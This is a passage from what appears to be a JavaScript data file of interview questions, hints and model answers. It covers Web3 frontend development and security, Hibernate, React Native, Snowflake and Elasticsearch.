      { q:'How do you build a Web3 frontend application? Walk me through the tech stack.', hint:'React + ethers.js or wagmi/viem. WalletConnect. IPFS for assets. The Graph for data. ENS for names. Alchemy/Infura for RPC. Hardhat for local development. Rainbow Kit or ConnectKit for wallet UI.', answer:`A modern Web3 frontend stack: React or Next.js as the framework. wagmi + viem is now the preferred Web3 library combination - wagmi provides React hooks (useAccount, useConnect, useContractRead, useContractWrite) with automatic wallet state management; viem is the underlying TypeScript library replacing ethers.js for type safety and performance. RainbowKit or ConnectKit provides polished wallet connection UI supporting MetaMask, WalletConnect, Coinbase Wallet, and dozens of others. RPC provider: Alchemy or Infura provides reliable Ethereum node access - do not run your own nodes for frontend apps. The Graph subgraph queries historical blockchain data efficiently via GraphQL - for example, querying all NFTs owned by an address or all trades in a DEX pool. ENS (Ethereum Name Service) resolves human-readable names (vitalik.eth) to addresses: const address = await provider.resolveName('vitalik.eth'). IPFS for storing/displaying NFT media. Hardhat Network or Anvil for local development with forked mainnet state.` },
      { q:'What are the main challenges and criticisms of current Web3 technology?', hint:'Scalability: throughput limits. UX: seed phrases, gas fees, wallet complexity. Environmental: PoW energy. Centralisation paradox: Infura, centralised exchanges. Regulation uncertainty. Speculation over utility. MEV.', answer:`Web3 faces significant challenges that honest practitioners should acknowledge. Scalability: Ethereum processes ~15 TPS vs Visa at 1,700 TPS - Layer 2 rollups improve this significantly but add complexity. UX: seed phrase management (catastrophic if lost, vulnerable if stored insecurely), gas fee estimation (confusing for non-technical users), and wallet connection friction prevent mainstream adoption. The centralisation paradox: most Web3 activity routes through a handful of centralised services (Infura for RPC, Alchemy, centralised exchanges for custody, AWS for frontend hosting, OpenSea marketplace) - decentralisation at the application layer while infrastructure remains centralised. MEV (Miner/Validator Extractable Value): block producers can front-run transactions, sandwich trades, and extract value from users in ways that are invisible and difficult to prevent. Regulatory uncertainty creates risk for builders and investors. Scam and fraud prevalence (rug pulls, phishing, smart contract exploits) erodes trust. Environmental impact of PoW mining remains despite Ethereum switching to PoS. I think about these trade-offs honestly when evaluating whether blockchain is the right solution for a given problem.` },
      { q:'How do you handle security in a Web3 application beyond smart contract audits?', hint:'Private key management: hardware wallets. Phishing: verify contract addresses. Front-end attacks: CSP headers, IPFS hosting. Dependency supply chain: npm audit. Multisig for treasury. Timelock for admin functions. Bug bounty.', answer:`Web3 application security goes beyond smart contract audits. Private key management: for treasury and admin keys, use hardware wallets (Ledger, Trezor) or multisig wallets (Safe, formerly Gnosis Safe) - N-of-M signatures required prevents single point of compromise. Always verify contract addresses before signing - phishing sites clone UIs with different contract addresses. Front-end security: CSP headers prevent XSS, SRI for CDN scripts, avoid npm packages with unnecessary blockchain access. Supply chain attacks on npm packages are a real vector - attackers inject malicious code into popular packages that exfiltrate private keys from browser-based wallets. IPFS hosting for the frontend removes the DNS hijacking attack vector (attackers changed DNS to point to malicious frontends in several protocol hacks). Timelock contracts on admin functions give users time to react to malicious admin actions. Bug bounties (Immunefi is the standard Web3 platform) incentivise responsible disclosure. Monitor on-chain activity with Tenderly or OpenZeppelin Defender for automated alerting on anomalous transactions.` },
    ],
    hibernate: [
      { q:'Explain the difference between Hibernate and JPA. How do they relate?', hint:'JPA: Java standard specification (interfaces). Hibernate: JPA implementation (and more). EntityManager = Hibernate Session wrapper. Can code to JPA spec for portability. Hibernate-specific features beyond JPA.', answer:`JPA (Java Persistence API) is a specification - a set of interfaces and annotations that define a standard ORM API for Java. JPA defines EntityManager, @Entity, @OneToMany, JPQL, and the persistence lifecycle. Hibernate is the most popular JPA implementation - it provides the concrete classes behind the JPA interfaces. When you use EntityManager, Spring's JPA support creates a Hibernate EntityManager internally. The value of coding to the JPA specification: portability between JPA providers (EclipseLink, OpenJPA) - though in practice most teams use Hibernate exclusively. Hibernate adds features beyond the JPA standard: Hibernate Query Language (HQL) extensions, filters, custom types, and the @NaturalId annotation. For most applications, using Spring Data JPA gives you JPA annotations, Spring repository abstractions, and Hibernate as the underlying engine - you interact with JpaRepository and @Entity, rarely touching Hibernate API directly. I use Hibernate-specific features only when the JPA standard cannot express what I need.` },
      { q:'How does Hibernate first and second level caching work?', hint:'L1 cache: Session (transaction) scope, automatic. L2 cache: SessionFactory scope, shared. Providers: Ehcache, Redis (via Redisson). @Cacheable, @Cache. Query cache. Cache invalidation on updates. Trade-offs.', answer:`Hibernate has two cache levels. First-level cache is the Session (or EntityManager persistence context) - automatic and always active. Within a single transaction, loading the same entity twice returns the same Java object instance, executing only one SQL query. When the session closes, the L1 cache is discarded. Second-level cache spans sessions and is shared across the application. It caches entity data by primary key - subsequent sessions requesting the same entity read from cache rather than the database. Configure with @Cache(usage = CacheConcurrencyStrategy.READ_WRITE) on the entity class and add an L2 cache provider (Ehcache, Caffeine, or Redis via Redisson). L2 cache is explicitly invalidated when entities are updated or deleted - Hibernate handles this automatically for entities it manages. Query cache caches the results of JPQL queries by query + parameters, useful for frequently executed stable queries. L2 cache trade-offs: improves read performance dramatically for stable, frequently read entities; adds complexity for write-heavy data since cache invalidation must be correct to prevent stale reads.` },
      { q:'What is the N+1 query problem in Hibernate and how do you solve it?', hint:'N+1: 1 query for parent list + N queries for each child. Caused by lazy loading in loops. Solutions: JOIN FETCH in JPQL, @EntityGraph, @BatchSize, @Fetch(FetchMode.SUBSELECT). Use query inspection to detect.', answer:`The N+1 problem is the most common Hibernate performance issue. It occurs when you load a list of N entities and then access a lazy-loaded association on each: loading 100 users each triggers a separate query to load their orders - 1 query for users + 100 queries for orders = 101 queries. Solutions: JPQL JOIN FETCH: SELECT u FROM User u JOIN FETCH u.orders fetches users with their orders in a single query (LEFT JOIN FETCH includes users with no orders). @EntityGraph on a repository method: @EntityGraph(attributePaths = "orders") User findById(Long id) dynamically applies eager loading for that specific query. @BatchSize(size=20) on the association delays loading but batches child queries: instead of 100 queries, it uses IN clauses to load children in batches of 20 (5 queries). @Fetch(FetchMode.SUBSELECT) loads all children in a single SELECT ... WHERE parent_id IN (...). I use Hibernate logging (spring.jpa.show-sql=true) or Datasource Proxy with p6spy to count queries and detect N+1 in development before they reach production.` },
      { q:'How do Hibernate transactions and the persistence context work?', hint:'EntityManager: persistence context, tracks managed entities. States: transient, managed, detached, removed. flush() syncs to DB. @Transactional boundaries. LazyInitializationException: accessing lazy relation outside session.', answer:`The persistence context is a first-level cache and change-tracking unit. Within a transaction, entities loaded through EntityManager are in the managed state - Hibernate tracks all changes made to them. When the transaction commits, Hibernate auto-flushes: it detects what changed and issues the appropriate SQL (INSERT, UPDATE, DELETE) in the correct order respecting foreign key constraints. This dirty checking is automatic - no save() call needed for managed entities. Entity states: Transient (new, not associated with a persistence context), Managed (loaded or persisted within active session), Detached (was managed, session closed), Removed (marked for deletion). LazyInitializationException is the most common Hibernate error: accessing a lazy-loaded association after the session closes. Solutions: use JOIN FETCH to load eagerly for the use case, use @Transactional to keep the session open for the view layer (Open Session in View - convenient but risky for N+1), or convert entities to DTOs within the transaction. I prefer explicit DTOs or projections over lazy loading in service layer code.` },
      { q:'How do you write complex queries in Hibernate?', hint:'JPQL: object-oriented, entity names not table names. Criteria API: type-safe programmatic queries. Native SQL: for DB-specific features. Spring Data: @Query, Specifications. Named queries.', answer:`Hibernate query options by complexity and type-safety. JPQL (Jakarta Persistence Query Language) uses entity class and field names rather than table and column names: SELECT u FROM User u WHERE u.email = :email. Portable across JPA providers, but as a string it has no compile-time type checking. Criteria API provides programmatic, type-safe queries: CriteriaBuilder cb = em.getCriteriaBuilder(); CriteriaQuery<User> q = cb.createQuery(User.class); Root<User> u = q.from(User.class); q.where(cb.equal(u.get("email"), email)). Verbose but allows dynamic query construction. Spring Data Specifications are a cleaner Criteria API abstraction for dynamic filtering - combine with Specification.and()/.or(). For complex reporting queries with database-specific features (window functions, CTEs, JSON operations), native SQL: em.createNativeQuery("SELECT ...", UserProjection.class). @NamedQuery defines reusable queries at the entity class level, parsed and validated at startup - fast for frequently executed queries.` },
      { q:'How do you handle entity relationships in Hibernate? Explain cascade types and fetch strategies.', hint:'@OneToMany, @ManyToOne, @ManyToMany. CascadeType: ALL, PERSIST, MERGE, REMOVE. Orphan removal. Fetch: LAZY (default for collections), EAGER (default for single). Bidirectional: mappedBy. JoinTable for ManyToMany.', answer:`Hibernate relationship annotations define both the Java object graph and the database join. @ManyToOne is the owning side and maps the foreign key column: @ManyToOne @JoinColumn(name="user_id") User user. @OneToMany(mappedBy="user") is the inverse side - it does not control the FK column but provides navigation. Cascade types control what happens to child entities when operations are performed on the parent: CascadeType.PERSIST propagates save to children; MERGE propagates updates; REMOVE deletes children when the parent is deleted; ALL combines all types. orphanRemoval = true automatically deletes child entities removed from the collection. Fetch strategy: EAGER loads the relationship immediately with the parent query; LAZY defers loading until the property is accessed. Collections default to LAZY; @ManyToOne and @OneToOne default to EAGER (this can cause unexpected joins - I explicitly set fetch = FetchType.LAZY on @ManyToOne). For @ManyToMany, Hibernate creates a join table; adding CascadeType.REMOVE to @ManyToMany can accidentally delete entities used by other relationships - use only PERSIST and MERGE for many-to-many.` },
      { q:'How do you optimise Hibernate for high-performance applications?', hint:'Batch inserts: spring.jpa.properties.hibernate.jdbc.batch_size. JDBC batching. Stateless sessions for bulk operations. Read-only transactions: @Transactional(readOnly=true). Projections instead of full entities. DB-specific optimisations. Hibernate Statistics.', answer:`Hibernate optimisation starts with measurement: Hibernate Statistics API or Datasource Proxy measures query counts and execution times - identify the actual bottleneck before optimising. Batch inserts: Hibernate sends individual INSERT statements by default; hibernate.jdbc.batch_size=50 enables JDBC batching to send 50 inserts in one round trip. Requires IDENTITY generation strategy to be replaced with SEQUENCE - IDENTITY requires immediate DB-generated ID after each insert, defeating batching. Read-only queries: @Transactional(readOnly = true) hints to Hibernate to skip dirty checking and flush - faster for queries that do not modify data. Projections: load DTOs instead of full entities for read-only views: SELECT new UserDto(u.name, u.email) FROM User u - transfers less data and skips entity state tracking. StatelessSession bypasses the persistence context entirely for bulk processing - no L1 cache, no dirty checking, no event listeners - up to 10x faster for large data loads. For bulk updates, JPQL UPDATE/DELETE queries execute in one SQL statement and are much faster than loading and updating entities individually.` },
    ],
    'react native': [
      { q:'How does React Native work under the hood? Explain the bridge and the new architecture.', hint:'Old: JS thread + bridge + native thread. Bridge: JSON serialisation overhead. New Architecture: JSI (direct JS-native calls), Fabric (renderer), TurboModules. Hermes JS engine. No more bridge overhead.', answer:`React Native renders native UI components (not web views) using JavaScript to describe the UI tree, which React Native translates to native platform components (UIView on iOS, View on Android). Old Architecture: three threads run in parallel - the JavaScript thread executes JS code; the native UI thread handles rendering and user events; the shadow thread computes layout with Yoga (flexbox). Communication between JS and native threads goes through the Bridge: a JSON serialisation mechanism that is asynchronous and creates performance overhead, especially for frequent updates like animations and gesture handling. New Architecture (introduced gradually from React Native 0.68): JSI (JavaScript Interface) allows JavaScript to directly hold references to and call native code synchronously, eliminating the Bridge serialisation overhead. Fabric is the new renderer using JSI for direct native tree mutations. TurboModules lazily load native modules via JSI instead of all upfront. The Hermes JavaScript engine (bundled since RN 0.70) is optimised for React Native - starts faster, uses less memory, and includes bytecode compilation.` },
      { q:'How does navigation work in React Native? Compare React Navigation and Expo Router.', hint:'React Navigation: stack, tab, drawer navigators. Navigation prop. Deep linking. Expo Router: file-based routing (like Next.js), built on React Navigation, deep links automatic. useNavigation hook. Safe area handling.', answer:`React Navigation is the standard navigation library. Navigator types: Stack Navigator (pushes screens, iOS push transition), Native Stack (uses native navigation primitives, better performance), Bottom Tab Navigator (tab bar), Drawer Navigator (side menu). Screens receive navigation and route props - navigation.navigate('Profile', { userId: 1 }), route.params.userId accesses passed data. useNavigation hook accesses navigation from deep in the component tree. Deep linking maps URL schemes (myapp://profile/123) to screens - configured in linking prop of NavigationContainer. Safe area: SafeAreaView or useSafeAreaInsets from react-native-safe-area-context handles the iPhone notch and Android status bar. Expo Router (Expo SDK 49+) brings file-based routing like Next.js Pages Router - app/index.tsx maps to the root screen, app/profile/[id].tsx maps to a dynamic profile screen. Expo Router builds on React Navigation internals, auto-generates deep links from file structure, and enables typed routes. I recommend Expo Router for new Expo projects; React Navigation for bare React Native or existing projects.` },
      { q:'How do you manage state in React Native? What is different from web React?', hint:'Same patterns: Context, Redux, Zustand, Jotai. Async storage for persistence: @react-native-async-storage. MMKV for fast synchronous storage. React Query for server state. Offline-first considerations. Background state.', answer:`State management patterns in React Native are largely the same as web React - useState, useReducer, Context, Redux Toolkit, Zustand, or Jotai. The differences come from mobile-specific concerns. Persistence: the web has localStorage, but React Native requires @react-native-async-storage/async-storage (promise-based, suitable for user settings and auth tokens) or react-native-mmkv (key-value store backed by native MMKV, synchronous and ~30x faster than AsyncStorage - ideal for frequently accessed data). For server state, React Query or SWR works the same as on web. Offline-first state: mobile apps must handle offline scenarios - React Query provides offline support with network mode configuration; WatermelonDB is a high-performance database for complex offline-first apps. App state transitions: AppState API detects when the app moves to background - I pause sync, save drafts, and refresh data when returning to foreground. For authentication state, I persist tokens in AsyncStorage or Keychain (react-native-keychain for secure credential storage using iOS Keychain and Android Keystore).` },
      { q:'How do you handle platform differences in React Native?', hint:'Platform.OS: "ios" | "android". Platform.select(). Platform-specific files: Component.ios.tsx, Component.android.tsx. Native modules: different implementations. Styling differences: elevation (Android) vs shadow (iOS). StatusBar component.', answer:`React Native allows targeting specific platforms in several ways. Conditional code: Platform.OS === 'ios' ? ... : ... or Platform.select({ ios: iOSValue, android: androidValue, default: fallback }). Platform-specific file extensions: Button.ios.tsx and Button.android.tsx - React Native automatically imports the correct file based on platform, allowing completely different implementations with the same import path. Styling differences: Android uses elevation for shadows (elevation: 5 creates a Material Design shadow); iOS uses shadow properties (shadowColor, shadowOffset, shadowRadius, shadowOpacity). Android has its own status bar behaviour - StatusBar component controls color and translucency with platform-specific options. Native modules: some native functionality requires platform-specific implementations - permissions (react-native-permissions), biometrics, background location. Expo's platform-specific modules handle these for you; bare React Native requires separate native implementations. I test on both platforms throughout development - relying on an emulator only at the end often reveals platform-specific issues that are expensive to fix.` },
      { q:'How do you optimise performance in React Native?', hint:'FlatList over ScrollView for long lists. memo/useCallback/useMemo. Reduce bridge calls. Hermes. RAM bundles/inline requires for startup. Avoid inline functions and objects in JSX. Flipper for profiling. useNativeDriver for animations.', answer:`React Native performance optimisation targets the JS-Native boundary and rendering. List optimisation: FlatList and SectionList are virtualised - they only render visible items, critical for long lists. ScrollView renders all children at once and should never be used for dynamic lists. Memoisation: React.memo prevents child re-renders when props have not changed; useCallback stabilises function references passed as props; useMemo caches expensive computations. Avoid creating new objects or arrays in JSX render (style={{ flex: 1 }} creates a new object every render) - define styles with StyleSheet.create() outside the component. Animation: always use useNativeDriver: true for Animated API calls - this runs animations on the native thread, bypassing the bridge entirely and enabling 60fps animations. For complex gestures, react-native-reanimated and react-native-gesture-handler run entirely on the UI thread. Startup performance: use Hermes (enabled by default in recent RN), enable RAM bundles for large apps, and use inline requires to delay importing rarely-used modules. Flipper with React DevTools and the Performance Monitor profile component renders and JS execution.` },
      { q:'How do you handle native modules and third-party libraries in React Native?', hint:'Expo managed workflow: limited to Expo SDK modules. Expo bare: eject to add native code. Custom native modules: Java/Kotlin (Android), ObjC/Swift (iOS). Linking: autolinking (RN 0.60+). EAS Build for CI native builds.', answer:`React Native native modules let you access platform APIs not exposed by React Native itself. Expo Managed workflow: restricted to modules in the Expo SDK - fastest development but limited native access. Expo Config Plugins extend native projects without ejecting for many common use cases. Bare workflow (or plain React Native): full access to native code; native modules are Java/Kotlin packages on Android and Objective-C/Swift pods on iOS. Auto-linking (React Native 0.60+): npm install react-native-camera; pod install auto-links the native code without manual linking. Writing a custom native module: create a Java class extending ReactContextBaseJavaModule, annotate methods with @ReactMethod, register in a ReactPackage, and expose to JS via NativeModules or TurboModules. iOS equivalent in Objective-C or Swift with RCT_EXPORT_MODULE and RCT_EXPORT_METHOD. JSI-based Turbo Modules enable synchronous calls and are the future standard. For building native code in CI, Expo EAS Build manages the native build environments (Xcode, Android SDK) as a cloud service, eliminating the need for Mac hardware for iOS builds in some workflows.` },
      { q:'How do you implement push notifications and background tasks in React Native?', hint:'Push notifications: Expo Notifications or Firebase Cloud Messaging (FCM/APNs). Background tasks: react-native-background-fetch, Expo Background Fetch, Expo TaskManager. Headless JS (Android). App state: foreground/background/killed.', answer:`Push notifications require platform-specific setup. Expo Notifications abstracts iOS APNs and Android FCM with a unified API - handles permissions, device token registration, foreground notification display, and notification handling callbacks. For bare RN, react-native-firebase provides FCM/APNs integration. Notification flow: request permissions, get the device push token, send the token to your server, server sends notification via FCM/APNs (or Expo Push Service), device receives and displays. Notification types: foreground (app open, custom handler), background tap (app in background, tap notification to open), background data (silent notification to wake app for data sync). Background tasks are heavily restricted by both iOS and Android for battery reasons. Expo Background Fetch (BackgroundFetch API): registered with Expo TaskManager, iOS grants approximately 15 minutes every few hours, Android is more permissive. For one-time background work on Android, Headless JS tasks run without UI. React Native Background Actions enables longer-running background work with a persistent notification (foreground service on Android). I minimise background work to essential sync operations and design apps to handle potentially not running in the background.` },
    ],
    snowflake: [
      { q:'How does Snowflake virtual warehouse architecture work?', hint:'Separation of compute and storage. Virtual warehouse: MPP compute cluster. Scale up: larger warehouse size. Scale out: multi-cluster. Auto-suspend/resume. Per-second billing. Storage: S3/Azure Blob/GCS. No contention between warehouses.', answer:`Snowflake separates compute (Virtual Warehouses) from storage (cloud object storage: S3, Azure Blob, GCS). Virtual Warehouses are MPP (Massively Parallel Processing) compute clusters that execute queries. They start and stop in seconds, billed per second of use. This separation means: multiple warehouses can query the same data simultaneously without contention, compute scales independently of storage, and paying for compute only when queries run (auto-suspend after idle period). Warehouse sizes (XS, S, M, L, XL, 2XL...) double the compute nodes per step. Scale up (larger warehouse) improves single query performance. Multi-cluster warehouses (Enterprise) scale out horizontally for concurrency - additional clusters spin up when queues form. The Snowflake query optimiser handles query execution, partition pruning, and result caching automatically. The result cache stores query results for 24 hours - identical queries return instantly without hitting the warehouse.` },
      { q:'What is the Snowflake data sharing feature and when would you use it?', hint:'Share live data between Snowflake accounts. No data copying. Consumer pays compute. Data marketplace. Reader accounts for non-Snowflake consumers. Row/object access policies for governance. Cross-region/cloud sharing.', answer:`Snowflake Secure Data Sharing allows sharing live database objects (tables, views, schemas) between Snowflake accounts without copying data. The share points to the provider account storage; consumers query their own virtual warehouse against the provider data. This is fundamentally different from traditional data sharing (ETL, replication, file exports) - consumers always see current data with no ETL lag. Use cases: sharing product analytics data with customers, sharing a data marketplace dataset with subscribers, inter-department data sharing within an organisation using separate Snowflake accounts. The consumer pays only their own compute costs. Governance: secure views can expose subsets of data based on row access policies - share only rows relevant to each consumer. Reader accounts give access to non-Snowflake organisations (Snowflake manages the account, consumer only queries). Data Marketplace allows listing datasets publicly or to specific organisations - a data vendor can monetise datasets by listing on the Marketplace where consumers directly query live data.` },
      { q:'How do you optimise Snowflake query performance?', hint:'Clustering keys for large tables. Materialized views. Result cache. Warehouse sizing. Query profile analysis. Avoid SELECT *. Prune with partition/clustering. Avoid SMJ on unsorted data. Search Optimization Service.', answer:`Snowflake query optimisation differs from traditional RDBMS because there are no manual indexes. Partition pruning: Snowflake automatically partitions data into micro-partitions (50-500MB compressed). Queries with WHERE clauses on columns with natural ordering (date, region) prune partitions automatically. Clustering Keys explicitly define clustering order for large tables where data is not naturally ordered for query patterns - ALTER TABLE orders CLUSTER BY (order_date). This is expensive (reclustering service runs asynchronously) and only worthwhile for very large tables (multi-TB) with predictable query patterns. Materialized Views pre-compute and store query results, refreshed automatically - ideal for complex aggregations queried frequently. Result Cache: Snowflake caches query results for 24 hours; identical queries (same SQL, same table state) return instantly. Query Profile in Snowflake UI shows execution plan, partition pruning effectiveness, and time spent per operation - I always inspect the profile for queries over 30 seconds. Search Optimization Service accelerates point lookup queries on non-clustering-key columns.` },
      { q:'What is Snowflake time travel and fail-safe? How are they different?', hint:'Time travel: user-controlled, up to 90 days (Enterprise), query/restore historical data. AT/BEFORE syntax. Fail-safe: 7-day Snowflake-only recovery after time travel window. Cannot access fail-safe yourself. Different use cases.', answer:`Time Travel allows users to query data as it existed at a past point in time. Syntax: SELECT * FROM orders AT(TIMESTAMP => '2025-01-15 09:00:00') or AT(OFFSET => -3600) for one hour ago or BEFORE(STATEMENT => query_id) to see state before a specific statement ran. Standard edition provides 1 day; Enterprise provides up to 90 days (configurable per table/schema). Use cases: recovering accidentally deleted or updated rows, auditing historical data states, and comparing current vs historical snapshots. Cloning a table at a historical point (CREATE TABLE orders_backup CLONE orders AT(OFFSET => -86400)) creates a zero-copy clone of historical state. Fail-Safe is a Snowflake-internal data recovery mechanism for catastrophic scenarios - after the time travel window expires, Snowflake retains data for 7 more days in fail-safe. Users cannot query fail-safe data; only Snowflake Support can recover it. Fail-safe adds to storage costs (counted in billing) but provides a final safety net. Storage costs: time travel data = change data during the period; fail-safe = 7 additional days.` },
      { q:'How does Snowflake handle semi-structured data like JSON?', hint:'VARIANT type: stores JSON/XML/Avro. Dot notation and bracket notation for querying. FLATTEN for arrays. PARSE_JSON. Schema on read. TYPEOF(). Lateral flatten. Automatic schema inference with INFER_SCHEMA.', answer:`Snowflake VARIANT type stores semi-structured data (JSON, XML, Avro, Parquet) as optimised binary representation with column-level compression and optimised storage. Load JSON into a VARIANT column with COPY INTO. Query with dot notation: SELECT src:customer.name::STRING, src:order_items[0].price::FLOAT FROM events. The ::TYPE cast converts VARIANT values to SQL types. FLATTEN is the key function for arrays: SELECT value:product_id, value:qty FROM events, LATERAL FLATTEN(input => src:items) - this unnests each array element as a separate row, enabling JOINs and aggregations on nested arrays. TYPEOF(field) returns the data type of a VARIANT field - useful for exploring unknown JSON structures. OBJECT_CONSTRUCT and ARRAY_CONSTRUCT create VARIANT values in SQL. INFER_SCHEMA automatically detects the schema of staged files, enabling CREATE TABLE with detected column definitions. For regular access patterns, querying VARIANT columns in Snowflake is often as fast as querying native typed columns because Snowflake stores VARIANT data with its own columnar optimisation.` },
      { q:'How do you implement data pipelines in Snowflake using Streams and Tasks?', hint:'Stream: change data capture, tracks DML changes (insert/update/delete). Task: scheduled SQL execution (cron syntax). Stream + Task = ELT pipeline. Multi-table transactions. Tree of tasks with dependencies.', answer:`Snowflake Streams implement Change Data Capture (CDC) - a stream on a table records all INSERT, UPDATE, and DELETE operations with metadata columns (METADATA$ACTION, METADATA$ISUPDATE, METADATA$ROW_ID). Querying the stream returns only changed rows since the last consumption. Tasks execute SQL statements on a schedule: CREATE TASK process_changes WAREHOUSE = compute_wh SCHEDULE = 'USING CRON 0 * * * * UTC' AS INSERT INTO target SELECT * FROM source_stream WHERE METADATA$ACTION = 'INSERT'. Combining stream + task creates an ELT pipeline: the stream captures upstream changes, the task processes and loads them to the target, all within Snowflake - no external orchestration needed for simple pipelines. Tree of tasks: tasks can depend on other tasks (predecessor tasks), building a DAG of processing steps. Multi-table streams track changes across multiple tables. Serverless tasks auto-manage compute - better for sporadic processing. For complex orchestration with branching logic, retry, and monitoring, I use Airflow or dbt alongside Snowflake Streams and Tasks rather than building complex logic in SQL.` },
      { q:'How do you implement Snowflake security and access control?', hint:'DAC + RBAC. Roles hierarchy: SYSADMIN, USERADMIN, custom roles. Object ownership. Row access policies. Column masking policies. Network policies (IP whitelist). MFA. SSO via SAML. Audit: QUERY_HISTORY, ACCESS_HISTORY.', answer:`Snowflake uses both Discretionary Access Control (object owners can grant permissions) and Role-Based Access Control (users are assigned roles, roles have permissions). Role hierarchy: ACCOUNTADMIN (full account management), SYSADMIN (create databases and warehouses), USERADMIN (manage users and roles), PUBLIC (automatic role for all users). I create custom functional roles (analyst_role, developer_role, data_engineer_role) with minimum necessary permissions, then assign these to users. Row Access Policies control which rows specific roles can see: CREATE ROW ACCESS POLICY region_policy AS (region_col VARCHAR) RETURNS BOOLEAN -> current_role() IN ('admin') OR region_col = CURRENT_USER_ATTRIBUTE('region'). Dynamic Data Masking policies mask sensitive column values based on role: SYSADMIN sees full credit card numbers, analyst_role sees masked values. Network Policies restrict access by IP range - essential for preventing access outside corporate networks. Audit: QUERY_HISTORY view tracks all queries with user, warehouse, duration, and bytes scanned; ACCESS_HISTORY records which columns were read. I use these for compliance reporting and anomaly detection.` },
    ],
    elasticsearch: [
      { q:'How does Elasticsearch store and index data? Explain the inverted index.', hint:'Document store + search engine. JSON documents. Index = collection of documents. Shard: Lucene index unit, primary + replica. Inverted index: term -> document list. Tokenisation, normalisation, analysis pipeline.', answer:`Elasticsearch is a distributed document store built on top of Apache Lucene, optimised for full-text search and analytics. Data is stored as JSON documents within an index (analogous to a database table). Each index is divided into shards - a shard is a Lucene index, the fundamental storage unit. Each shard has configurable primary and replica copies for availability and read scalability. The inverted index is the core search data structure: during indexing, the analysis pipeline tokenises text (split on whitespace, remove punctuation), applies filters (lowercase, stemming, stop words), and builds a mapping from each term to the sorted list of document IDs containing that term. A search for "elasticsearch guide" finds the intersection of documents matching "elasticsearch" and "guide" in microseconds. This is fundamentally different from RDBMS full-text search - SQL LIKE '%search%' requires a full table scan; the inverted index makes this a lookup. Elasticsearch adds BM25 relevance scoring, aggregations, geospatial queries, and a distributed execution layer on top of Lucene.` },
      { q:'How do you design an Elasticsearch index mapping for a production use case?', hint:'Explicit mapping: disable dynamic mapping for production. field types: text (analysed) vs keyword (exact match). Multi-field: text + keyword. Nested vs object. Date formats. Index templates. Index lifecycle management.', answer:`Explicit mapping is essential for production - dynamic mapping (auto-detecting field types) creates surprises. Disable it: "dynamic": "strict" makes Elasticsearch reject documents with unmapped fields. Field type decisions: text is analysed (tokenised, lowercased, stemmed) and supports full-text search but not exact aggregations or sorting. keyword is not analysed, supports exact match, aggregations, and sorting. For fields needing both: multi-field mapping creates text and keyword sub-fields: "title": { "type": "text", "fields": { "keyword": { "type": "keyword" } } } - search title for full-text, aggregate on title.keyword for exact values. Nested type for arrays of objects where you need to query object properties together (not the default flattened object type which loses object boundaries). Date fields with format specification. Index templates automatically apply mapping and settings to new indices matching a pattern - essential for time-series indices (logs-2025.01.*). Index Lifecycle Management (ILM) automatically transitions indices through hot/warm/cold/delete phases based on age or size, moving older data to cheaper storage tiers.` },
      { q:'How do you write effective Elasticsearch queries? Explain query context vs filter context.', hint:'query context: relevance scoring (BM25). filter context: yes/no, cached. bool query: must/filter/should/must_not. Full-text: match, match_phrase. Exact: term, terms. Range. Aggregations: terms, date_histogram, avg, nested.', answer:`Elasticsearch queries are JSON documents in the Query DSL. Query context computes relevance scores (how well does this document match?) - match and multi_match for full-text search use the BM25 algorithm to score by term frequency and field length. Filter context is binary (match or not) and results are cached - term, terms, range, and exists filters are faster and cacheable. Bool query combines clauses: must (must match, contributes to score), filter (must match, no score, cached), should (nice to have, boosts score), must_not (must not match, no score, cached). For typical search with filtering: bool.filter for exact criteria (status: active, date range), bool.must for full-text search (title, description). Aggregations run in the filter context for speed: terms aggregation counts documents per unique value; date_histogram buckets by time; avg, sum, percentiles for metrics. Nested aggregations run sub-aggregations within each bucket. Pipeline aggregations compute metrics across bucket results (derivative, cumulative sum).` },
      { q:'How do you handle Elasticsearch at scale? Explain sharding and cluster architecture.', hint:'Primary shards: fixed at index creation. Replica shards: for availability and read scaling. Shard sizing: 20-50GB ideal. Hot-warm-cold architecture. Index aliasing for reindexing. Cross-cluster search. JVM heap: 50% of RAM, max 32GB.', answer:`Elasticsearch cluster architecture: master nodes (1 or 3) manage cluster state and shard allocation without handling search requests. Data nodes hold shards and execute queries - scale horizontally for more capacity. Coordinating nodes receive client requests, fan out to relevant shards, merge results, and return responses. Primary shard count is fixed at index creation - plan carefully since reindexing is required to change it. Replica shards are copies of primaries, providing availability and parallel read capacity. Shard sizing: 20-50GB per shard is the general guideline - too small means overhead from too many shards; too large means slow recovery. For time-series data (logs, metrics), I use one index per day or week with ILM: hot tier (fast SSD nodes) holds recent data, warm tier (standard storage) holds older data, cold tier (frozen/searchable snapshots on object storage) for archival. Index aliases provide a stable name while rotating the underlying index - reindex to a new index and flip the alias atomically for zero-downtime schema changes. JVM heap should be no more than 50% of RAM and never exceed 32GB (above 32GB Java uses uncompressed object pointers, wasting memory).` },
      { q:'How do you monitor and troubleshoot Elasticsearch?', hint:'Cluster health: red/yellow/green. cat APIs: cat/shards, cat/indices. Slow log: query and index slow logs. JVM GC overhead. Hot threads API. Task management API. Memory pressure. Kibana monitoring.', answer:`Cluster health has three states: green (all primary and replica shards assigned), yellow (all primaries assigned, some replicas unassigned - common in single-node clusters), red (some primary shards unassigned - data unavailable). GET /_cluster/health shows the overall status; GET /_cluster/allocation/explain diagnoses why specific shards are unassigned (disk space, node exclusion, too many shards). Cat APIs are human-readable diagnostics: GET /_cat/shards?v&h=index,shard,prirep,state,docs,store,node shows shard distribution; GET /_cat/indices?v&h=health,status,index,docs.count,store.size. Slow query log: set slowlog thresholds to log queries and fetches exceeding X milliseconds - essential for identifying slow search patterns. Hot threads API (GET /_nodes/hot_threads) shows CPU-intensive thread stacks - identifies runaway aggregations or analysis. JVM memory: watch heap usage and GC overhead in Kibana Stack Monitoring or Prometheus metrics. High old generation heap usage with frequent GC indicates insufficient heap or a memory-intensive query. Field data circuit breaker prevents out-of-memory for aggregations on analysed text fields.` },
